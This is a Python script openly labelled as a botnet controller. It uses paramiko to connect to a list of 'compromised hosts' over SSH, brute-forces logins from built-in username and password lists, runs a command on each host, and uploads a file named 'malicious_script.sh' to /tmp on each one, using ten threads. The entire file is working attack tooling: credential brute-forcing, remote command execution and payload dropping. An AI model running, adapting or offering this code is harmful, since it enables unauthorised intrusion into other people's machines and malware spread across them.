import paramiko
import threading
import time
from queue import Queue
import os
from colorama import Fore, Style

# Create a Queue to manage the botnet tasks
task_queue = Queue()

# Thread lock to prevent race conditions during output
print_lock = threading.Lock()

# Command and Control (C2) Server List
compromised_hosts = [
    {"ip": "192.168.1.1", "username": "admin", "password": "password1"},
    {"ip": "192.168.1.216", "username": "kali", "password": "adminpass"},
    # Add more compromised hosts or leave blank for brute-forcing
]

# Brute-force user and password lists for SSH login (if credentials are unknown)
username_list = ['root', 'admin', 'user']
password_list = ['password1', 'adminpass', '123456', 'toor']

# Command to be executed on the remote system (can be dynamically set)
command_to_run = "uname -a"

# Path to the file to be transferred to remote machines (optional)
file_to_transfer = "malicious_script.sh"


# Function to brute-force SSH credentials if unknown
def ssh_brute_force(host):
    for username in username_list:
        for password in password_list:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host['ip'], username=username, password=password, timeout=5)
                
                with print_lock:
                    print(Fore.GREEN + f"[+] Brute-force successful for {host['ip']} with {username}/{password}" + Style.RESET_ALL)
                
                # If successful, update host dictionary
                host['username'] = username
                host['password'] = password
                return True

            except paramiko.AuthenticationException:
                # If authentication fails, move to the next username/password
                pass
            except Exception as e:
                with print_lock:
                    print(Fore.RED + f"[-] Connection failed to {host['ip']}: {str(e)}" + Style.RESET_ALL)
                return False
    return False


# Function to establish an SSH connection and execute a command
def ssh_connect_and_execute(host):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host['ip'], username=host['username'], password=host['password'], timeout=5)
        
        # Execute the command
        stdin, stdout, stderr = client.exec_command(command_to_run)
        output = stdout.read().decode('utf-8')
        error = stderr.read().decode('utf-8')
        
        with print_lock:
            print(Fore.BLUE + f"[+] Successfully connected to {host['ip']}" + Style.RESET_ALL)
            print(f"Command output: {output}")
            if error:
                print(f"Error: {error}")
        
        # Optional: transfer a file to the host
        if file_to_transfer:
            sftp = client.open_sftp()
            remote_path = f"/tmp/{os.path.basename(file_to_transfer)}"
            sftp.put(file_to_transfer, remote_path)
            sftp.close()
            with print_lock:
                print(Fore.CYAN + f"[+] File transferred to {host['ip']} at {remote_path}" + Style.RESET_ALL)
        
        client.close()
    
    except paramiko.AuthenticationException:
        with print_lock:
            print(Fore.RED + f"[-] Authentication failed for {host['ip']}" + Style.RESET_ALL)
        # Attempt brute-forcing credentials if necessary
        brute_force_success = ssh_brute_force(host)
        if brute_force_success:
            ssh_connect_and_execute(host)  # Retry with found credentials
    
    except Exception as e:
        with print_lock:
            print(Fore.RED + f"[-] Connection failed to {host['ip']}: {str(e)}" + Style.RESET_ALL)


# Worker function for multithreading
def worker():
    while True:
        host = task_queue.get()  # Get a host from the queue
        ssh_connect_and_execute(host)  # Try to connect and execute commands
        task_queue.task_done()  # Mark the task as done


# Main function to start the botnet
def main():
    number_of_threads = 10  # Set number of threads for parallel execution
    
    # Start the worker threads
    for _ in range(number_of_threads):
        thread = threading.Thread(target=worker)
        thread.daemon = True  # Daemonize threads to exit with the program
        thread.start()
    
    # Add the compromised hosts to the task queue
    for host in compromised_hosts:
        task_queue.put(host)
    
    task_queue.join()  # Wait for all tasks to complete
    print("\n[+] All tasks completed on all hosts.")


if __name__ == "__main__":
    main()
